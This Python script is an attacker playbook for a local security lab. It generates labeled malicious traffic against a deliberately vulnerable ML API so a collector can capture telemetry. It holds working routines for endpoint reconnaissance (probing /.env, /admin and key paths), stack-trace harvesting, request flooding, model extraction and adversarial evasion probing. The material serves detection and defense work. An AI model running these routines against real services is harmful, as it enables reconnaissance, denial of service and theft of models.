#!/usr/bin/env python3
"""
Attacker playbook for The Range. Runs from the lab's "attacker box" against the
vulnerable ML API and drives real traffic through it so the telemetry collector
captures labeled malicious activity.

Each routine is tagged with the ATT&CK / ATLAS technique it demonstrates. Run
only against your own local lab target.

    python attacks/run_attacks.py --target http://localhost:8000 --only all
"""
from __future__ import annotations

import argparse
import random
import time

import requests

random.seed(1337)


def recon_endpoint_sweep(base: str):           # ATT&CK T1595
    print("[*] T1595 endpoint discovery")
    for p in ["/admin", "/debug", "/model", "/.env", "/metrics", "/backup", "/v1/keys"]:
        try:
            r = requests.get(base + p, headers={"User-Agent": "Nmap Scripting Engine"}, timeout=3)
            print(f"    {p:<12} -> {r.status_code}")
        except requests.RequestException as e:
            print(f"    {p:<12} -> err {e.__class__.__name__}")


def recon_verbose_errors(base: str):           # ATT&CK T1592
    print("[*] T1592 harvest verbose errors")
    for bad in ['{"pixels": "notalist"}', '{"nope": 1}', '{']:
        try:
            r = requests.post(base + "/predict", data=bad,
                              headers={"Content-Type": "application/json", "User-Agent": "curl/8.4.0"}, timeout=3)
            leaked = "trace" in r.text
            print(f"    status {r.status_code}  stacktrace_leaked={leaked}")
        except requests.RequestException:
            pass


def abuse_rate_flood(base: str, n: int = 120):  # ATT&CK T1499
    print(f"[*] T1499 inference flood ({n} req)")
    payload = {"pixels": [random.random() for _ in range(64)]}
    ok = 0
    for _ in range(n):
        try:
            if requests.post(base + "/predict", json=payload,
                             headers={"User-Agent": "python-urllib3/2.0"}, timeout=3).ok:
                ok += 1
        except requests.RequestException:
            pass
    print(f"    {ok}/{n} accepted (no rate limiting observed)" if ok else "    blocked")


def ml_model_extraction(base: str, n: int = 60):  # ATLAS AML.T0024
    print(f"[*] AML.T0024 model extraction ({n} boundary queries)")
    seen = {}
    for _ in range(n):
        payload = {"pixels": [random.gauss(0, 128) for _ in range(64)]}  # high-entropy probes
        try:
            r = requests.post(base + "/predict", json=payload,
                             headers={"User-Agent": "python-requests/2.31.0"}, timeout=3).json()
            seen[r.get("label")] = seen.get(r.get("label"), 0) + 1
        except requests.RequestException:
            pass
    print(f"    recovered label distribution across {len(seen)} classes: {seen}")


def ml_evasion_probe(base: str, n: int = 30):   # ATLAS AML.T0015
    print(f"[*] AML.T0015 evasion probing ({n} perturbed inputs)")
    base_px = [random.random() for _ in range(64)]
    flips = 0
    last = None
    for i in range(n):
        px = [p + random.gauss(0, 0.02 * i) for p in base_px]  # growing perturbation
        try:
            lbl = requests.post(base + "/predict", json={"pixels": px},
                               headers={"User-Agent": ""}, timeout=3).json().get("label")
            if last is not None and lbl != last:
                flips += 1
            last = lbl
        except requests.RequestException:
            pass
    print(f"    decision boundary crossed {flips}x as perturbation grew")


ROUTINES = {
    "recon_sweep": recon_endpoint_sweep,
    "recon_errors": recon_verbose_errors,
    "flood": abuse_rate_flood,
    "extraction": ml_model_extraction,
    "evasion": ml_evasion_probe,
}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://localhost:8000")
    ap.add_argument("--only", default="all", help="comma list of " + ",".join(ROUTINES) + " or 'all'")
    args = ap.parse_args()

    base = args.target.rstrip("/")
    try:
        requests.get(base + "/health", timeout=3)
    except requests.RequestException:
        raise SystemExit(f"[!] target {base} not reachable — is the stack up? (make up)")

    chosen = list(ROUTINES) if args.only == "all" else args.only.split(",")
    for name in chosen:
        ROUTINES[name](base)
        time.sleep(0.3)
    print("\n[+] attack run complete — check data/ for captured telemetry")


if __name__ == "__main__":
    main()
